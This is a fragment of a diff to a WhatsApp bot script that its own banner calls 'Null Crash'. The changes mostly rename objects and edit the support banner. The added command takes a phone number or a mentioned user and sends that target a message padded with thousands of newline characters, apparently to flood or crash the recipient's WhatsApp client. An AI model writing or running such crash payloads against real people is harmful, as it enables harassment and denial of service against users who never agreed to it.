-det.sendMessage(target, {text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`}, { quoted: HKQuoted })
+if (!text) return reply(`*Invalid format ❌*\nExample: ${command} 234xxx`)
+target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+minato.sendMessage(target, {text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`}, { quoted: HKQuoted })
 }
 break;
 
 case 'support': {
 if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
     let support = `
-*ꪶ ¡ϻ Nᴜʟʟ ꫂ 𝚂𝚄𝙿𝙿𝙾𝚁𝚃*
+*Nᴜʟʟ Cʀᴀsʜ 𝚂𝚄𝙿𝙿𝙾𝚁𝚃*
 
 *𝙱𝙾𝚃 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 :* ꪶ ¡ϻ Nᴜʟʟ ꫂ
 *𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 :* https://t.me/Nullisback
@@ -1656,10 +1637,10 @@ if (!isCreator) return reply("*⛔ Access denied: this command is restricted to 
 https://whatsapp.com/channel/0029VbBwJYo6BIEp0Xlm1G0S
 
 > Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ`
-    det.sendMessage(n.chat, { 
+    minato.sendMessage(m.chat, { 
         text: support,
         contextInfo: {
-            mentionedJid: [n.sender],
+            mentionedJid: [m.sender],
             isForwarded: true,
             externalAdReply: {
                 showAdAttribution: false,
